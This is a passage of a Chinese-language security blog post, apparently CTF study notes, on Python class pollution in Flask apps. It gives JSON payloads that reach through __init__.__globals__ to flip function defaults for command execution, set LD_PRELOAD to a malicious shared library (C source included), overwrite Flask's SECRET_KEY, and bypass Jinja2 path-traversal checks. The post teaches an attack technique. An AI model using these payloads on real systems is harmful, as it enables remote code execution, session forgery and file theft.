<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">print(obj.__init__.__globals__[&#x27;sys&#x27;])#globals是字典，用[]</span><br><span class="line">#sys是模块对象,用.</span><br><span class="line">#print(obj.__init__.__globals__[&#x27;sys&#x27;].modules)</span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;sys&quot; : &#123;</span><br><span class="line">                &quot;modules&quot; : &#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="loader利用"><a href="#loader利用" class="headerlink" title="loader利用"></a><code>loader</code>利用</h2><p>利用python中的加载器<code>loader</code></p>
<p>为了实现模块加载而设计的，具体实现是在<code>importlib</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="built_in">print</span>(importlib.__spec__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(importlib.__spec__.loader.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#__loader__的使用</span></span><br><span class="line"><span class="keyword">import</span> numpy<span class="comment">#任意一个都可以</span></span><br><span class="line"><span class="built_in">print</span>(numpy.__loader__.__init__.__globals__)<span class="comment">#注意要__init__；</span></span><br><span class="line"><span class="comment">#__loader__后是加载器，__init__是python写的才有__globals__，</span></span><br><span class="line"><span class="comment">#用c写的没有</span></span><br><span class="line"><span class="comment">#eg:os,sys,math,builtins，他们的都是&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;，是c实现的</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<p><code>__loader__</code>后是加载器，<code>__init__</code>是python写的才有<code>__globals__</code>，<br>用c写的没有<br><code>eg:os,sys,math,builtins</code>，他们的都是<code>&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;</code>，是c实现的</p>
</blockquote>
<p>在 Python 中，**<code>__spec__</code>** 是一个<strong>模块对象的内置属性</strong>（不是loader的），用于描述该模块是如何被<strong>导入系统（import system）加载的</strong>。</p>
<p><strong>同时 importlib 的所有 .py 文件都 import sys 了</strong></p>
<p>对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类</p>
<p>——即import出来的模块，都有对应的<code>__loader__</code>（个人理解）</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>优先用<code>__spec__</code></p>
<h2 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h2><p><code>__defaults__</code>：存储普通关键字参数（keyword-only之前的）的默认值，类型是元组(tuple)</p>
<p><code>__kwdefaults__</code>：存储关键字专属参数（keyword-only）的默认值，类型是字典(dict)</p>
<p>使用 <code>*</code> 作为分隔符，<code>*</code> <strong>之后的参数就是 keyword-only 参数</strong></p>
<p><code>kwd</code>必须要<strong>带参传值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def func(a, b, *, c, d=10):</span><br><span class="line">	...</span><br><span class="line">func(1, 2, c=3)#对</span><br><span class="line">func(1,2,3)#错</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def func_a(a, b=2, c=3): ...</span><br><span class="line"># __defaults__ = (2, 3)</span><br><span class="line"></span><br><span class="line">def func_c(a, b=2, *, c=3): ...</span><br><span class="line"># __defaults__ = (2,)</span><br><span class="line"># __kwdfaults__ = &#123;&#x27;c&#x27;: 3&#125;</span><br><span class="line"></span><br><span class="line">#这些属性可写</span><br></pre></td></tr></table></figure>

<p>场景：</p>
<p>存在危险函数，默认下是安全的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def evilFunc(cmd, shell=False):</span><br><span class="line">	if shell:</span><br><span class="line">		os.system(cmd) #危险</span><br><span class="line">	else:</span><br><span class="line">		print(cmd) #安全</span><br></pre></td></tr></table></figure>

<p>通过污染来实现RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 原函数：evilFunc(cmd, shell=False)</span><br><span class="line"># shell 是第二个参数 → 在 __defaults__ 中是 (False,)</span><br><span class="line"></span><br><span class="line"># 污染 payload：</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;evilFunc&quot;: &#123;</span><br><span class="line">                &quot;__defaults__&quot;: (True,)  # 注意：必须是元组！</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!WARNING]</p>
<p>但 <strong>JSON 不支持元组</strong>(POST上传)！所以需要后端能解析出 tuple（比如用 <code>ast.literal_eval</code> 或自定义解析）。如果后端直接用 <code>json.loads</code>，则 <code>(True,)</code> 会被转成 <code>[True]</code>（list），赋值会失败或报错。 </p>
</blockquote>
<p>同理，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def evilFunc(cmd, *, shell=False):</span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line"># 污染 payload:</span><br><span class="line">payload = &#123;</span><br><span class="line">	&quot;__init__&quot;: &#123;</span><br><span class="line">		&quot;__globals__&quot;: &#123;</span><br><span class="line">			&quot;evilFunc&quot;: &#123;</span><br><span class="line">				&quot;__kwdefaults__&quot;: &#123;&quot;shell&quot;: True&#125; #JSON原生支持字典</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="os-environ污染"><a href="#os-environ污染" class="headerlink" title="os.environ污染"></a><code>os.environ</code>污染</h2><p>（环境变量劫持）</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
<li><code>os.environ</code>是<code>os._Environ</code>对象（类似dict），存储当前进程的环境变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;__init__&quot;: &#123;</span><br><span class="line">		&quot;__globals__&quot;: &#123;</span><br><span class="line">			&quot;os&quot;: &#123;</span><br><span class="line">				&quot;environ&quot;: &#123;</span><br><span class="line">					&quot;LD_PRELOAD&quot;: &quot;/app/exp.so&quot;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面用<code>os.system(&quot;id&quot;)</code>会加载恶意<code>.so</code>，实现RCE</p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code>——一个Linux环境变量，用于在程序运行时<strong>优先加载指定的共享库</strong>（.so文件），甚至在标准库前</p>
<p>即，设置后，任何新启动的程序（<code>/bin/id</code>）会先加载<code>/app/exp.so</code></p>
<p><code>os.system(&quot;id&quot;)</code>启动了一个<strong>新进程</strong></p>
<p><code>.so</code>——动态链接器，制造恶意<code>.so</code>，构造函数中执行任意代码&#x3D;&#x3D;&gt;RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// exp.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void init() &#123;</span><br><span class="line">    system(&quot;id &gt; /tmp/pwned.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//编译</span><br><span class="line">gcc -shared -fPIC -o exp.so exp.c</span><br><span class="line">(注意，上传给Linux的话，要在Linux上进行编译)</span><br></pre></td></tr></table></figure>

<h2 id="FlaskSECRET-KEY污染"><a href="#FlaskSECRET-KEY污染" class="headerlink" title="FlaskSECRET_KEY污染"></a>Flask<code>SECRET_KEY</code>污染</h2><p>Session伪造</p>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul>
<li>Flask使用<code>SECRET_KEY</code>对session进行签名</li>
<li>知道的话，可以伪造任意session（登录、权限）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;SECRET_KEY&quot;</span>: <span class="string">&quot;attacker_controlled&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>污染后，攻击者可以本地生成合法session，实现权限提升</p>
<h2 id="got-first-request污染"><a href="#got-first-request污染" class="headerlink" title="_got_first_request污染"></a><code>_got_first_request</code>污染</h2><h2 id="静态文件目录穿越"><a href="#静态文件目录穿越" class="headerlink" title="静态文件目录穿越"></a>静态文件目录穿越</h2><p><code>_static_url_path</code></p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul>
<li>Flask默认静态文件路径为<code>./static</code></li>
<li><code>_static_url_path</code>控制该前缀对应的文件系统路径</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_static_url_path&quot;</span>: <span class="string">&quot;.&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  就有<code>http://host/static/flag</code>&#x3D;&#x3D;&gt;<code>http://host/static/flag</code></p>
<h2 id="模板目录穿透"><a href="#模板目录穿透" class="headerlink" title="模板目录穿透"></a>模板目录穿透</h2><p><code>os.path.pardir</code>污染</p>
<h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><ul>
<li>Jinja2在<code>split_template_path()</code>中检查路径是否包含<code>..</code>（即<code>os.path.pardir</code>）</li>
<li>如果匹配，报错<code>TemplateNotFound</code>防止目录穿透</li>
<li><code>os.path.pardir</code>可改</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;os&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;pardir&quot;</span>: <span class="string">&quot;!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>/../../../flag</code>时，不会被阻拦，实现读取</p>
<h2 id="模板语法限制绕过"><a href="#模板语法限制绕过" class="headerlink" title="模板语法限制绕过"></a>模板语法限制绕过</h2><ul>
<li>Jinjia默认只识别<code>&#123;&#123;flag&#125;&#125;</code></li>
<li>动态改语法标识符</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;jinja_env&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;variable_start_string&quot;</span>: <span class="string">&quot;[[&quot;</span>,</span><br><span class="line">          <span class="string">&quot;variable_end_string&quot;</span>: <span class="string">&quot;]]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即禁用了<code>&#123;&#123;&#125;&#125;</code>，现在可以用<code>[[]]</code>来操作了</p>
<p>——注意：由于已经存在污染前生成的缓存了，所以，是要重启容器，后，在污染后再访问模板</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">mervin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">http://example.com/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">have a good time!</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post-share"><div class="social-share" data-image="https://p111223.github.io/imgs/2025-04-29 212727.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/17/GAN-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/" title="GAN_代码生成"><img class="cover" src="https://p111223.github.io/imgs/2025-05-01 005434.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">GAN_代码生成</div></div><div class="info-2"><div class="info-item-1">基于tensorflow依赖 3个外部库：tensorflow、numpy、matplotlib 用Sequential搭网络，用Model做GAN的链式模型？？？  超参不会在反向传播里更新，但直接决定模型能否收敛、生成质量、训练速度 这些参数是要可重复，为了调参方便，可自动化搜索  [!IMPORTANT] 这三个参数是生成对抗网络（GAN）或深度学习模型训练中最核心的超参数，常用于控制模型的训练过程和输入数据形态，简要解析如下：  EPOCHS &#x3D; 50“EPOCHS”（迭代次数）指整个训练数据集被模型完整训练一遍的次数。    50表示训练时，所有训练样本会被模型“过”50次；   作用：太少会导致模型“欠拟合”（没学会数据规律），太多可能导致“过拟合”（只记住训练数据、泛化能力差），50是常见的中等迭代次数，适用于数据量适中、模型复杂度一般的场景。   BATCH_SIZE &#x3D; 128“BATCH_SIZE”（批次大小）指每次模型参数更新时，输入的样本数量。 ...</div></div></div></a><a class="pagination-related" href="/2026/01/20/%E5%9F%BA%E4%BA%8EMCP%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7AI%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F/" title="基于MCP的轻量级AI工具调用系统"><img class="cover" src="https://p111223.github.io/imgs/2025-05-19 230455.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">基于MCP的轻量级AI工具调用系统</div></div><div class="info-2"><div class="info-item-1">基于 MCP 协议构建可插拔的 AI 工具调用系统：以天气查询为例  本文将带你从零实现一个基于 Model Context Protocol (MCP) 的轻量级 AI 工具调用系统，展示如何让大模型安全、标准化地访问本地或远程数据源，并通过百炼（DashScope）的 Qwen 大模型完成自然语言交互。  什么是 MCP？MCP（Model Context Protocol）是一种新兴的标准化协议，用于连接大语言模型（LLM）与外部工具服务。其核心思想是：  将真实世界的功能（如查询天气、读取数据库）封装为“工具”（Tool） 通过统一协议（如 stdio）暴露给 LLM 客户端 LLM 仅需理解工具的元信息（名称、参数、描述），无需关心底层实现  MCP 架构包含三个关键角色：    角色 说明    MCP 主机（Host） 如 Claude Desktop、IDE 插件等，发起对工具的请求   MCP 客户端（Client） 负责与 LLM 和 MCP 服务器通信，协调工具调用流程   MCP 服务器（Server） 轻量级程序，封装具体业务逻辑（如调用...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/07/ssti/" title="ssti"><img class="cover" src="https://p111223.github.io/imgs/2025-05-19 230415.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="info-item-2">ssti</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img class="cover" src="https://p111223.github.io/imgs/2025-05-19 230455.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-17</div><div class="info-item-2">反序列化</div></div><div class="info-2"><div class="info-item-1">什么是反序列化​        反序列化过程将不可信的数据（字节流）重新构建为内存中的对象时，如果程序对反序列化的内容、类型或过程缺乏严格控制，攻击者可以构造恶意数据来欺骗程序执行非预期的代码或操作，从而引发严重的安全风险。 序列化与反序列化的本质（基础） 序列化： 将内存中的对象（包含数据及其状态、甚至可执行代码的引用）转换（编码）成一个可以存储（如文件）或传输（如网络）的字节流格式（如二进制、JSON、XML等）。 反序列化： 将接收到的字节流数据重新解析、还原（解码）成内存中的活动对象，恢复其原有的数据、状态和结构。  漏洞来源 过度信任： 程序在反序列化时，通常默认接收到的数据是合法的、由可信来源生成的、结构正确的，其按照序列化格式的规则去重建对象。 魔术方法&#x2F;钩子函数： 许多面向对象编程语言（如 Java, Python, PHP, .NET）在反序列化过程中会自动调用对象的特定方法。这些方法原本是为了方便开发者在对象重建时执行必要的初始化操作（如连接资源、设置状态）。 攻击者的切入点：...</div></div></div></a><a class="pagination-related" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马"><img class="cover" src="https://p111223.github.io/imgs/2025-05-01 010058.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">ssti内存马</div></div><div class="info-2"><div class="info-item-1">Flask环境（旧版）#1app.add_url_rule() &#x2F;&#x2F;创实现一个路由 12345678910111213141516171819202122Flask.add_url_rule can now also register a view function.——Version 0.2The endpoint for the Module.add_url_rule method is now optional to be consistent with the function of the same name on the application object.——Version 0.6Flask no longer internally depends on rules being added through the add_url_rule function and can now also accept regular werkzeug rules added to the url map.——Version 0.7Flask...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">mervin</div><div class="author-info-description">欢迎来到mervin的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/p111223" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3776130943@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">python原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">合并函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-number">1.2.</span> <span class="toc-text">解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class-%E5%92%8C-base-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">__class__和__base__的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-globals-%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">__init__+__globals__利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#loader%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">loader利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="toc-number">1.4.</span> <span class="toc-text">参数篡改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#os-environ%E6%B1%A1%E6%9F%93"><span class="toc-number">1.5.</span> <span class="toc-text">os.environ污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">1.5.2.</span> <span class="toc-text">LD_PRELOAD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FlaskSECRET-KEY%E6%B1%A1%E6%9F%93"><span class="toc-number">1.6.</span> <span class="toc-text">FlaskSECRET_KEY污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.6.1.</span> <span class="toc-text">原理：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#got-first-request%E6%B1%A1%E6%9F%93"><span class="toc-number">1.7.</span> <span class="toc-text">_got_first_request污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.8.</span> <span class="toc-text">静态文件目录穿越</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.2.</span> <span class="toc-text">代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F"><span class="toc-number">1.9.</span> <span class="toc-text">模板目录穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A-1"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.</span> <span class="toc-text">模板语法限制绕过</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/20/%E5%9F%BA%E4%BA%8EMCP%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7AI%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F/" title="基于MCP的轻量级AI工具调用系统"><img src="https://p111223.github.io/imgs/2025-05-19 230455.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于MCP的轻量级AI工具调用系统"/></a><div class="content"><a class="title" href="/2026/01/20/%E5%9F%BA%E4%BA%8EMCP%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7AI%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F/" title="基于MCP的轻量级AI工具调用系统">基于MCP的轻量级AI工具调用系统</a><time datetime="2026-01-20T14:11:31.000Z" title="发表于 2026-01-20 22:11:31">2026-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染"><img src="https://p111223.github.io/imgs/2025-04-29 212727.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python原型链污染"/></a><div class="content"><a class="title" href="/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" 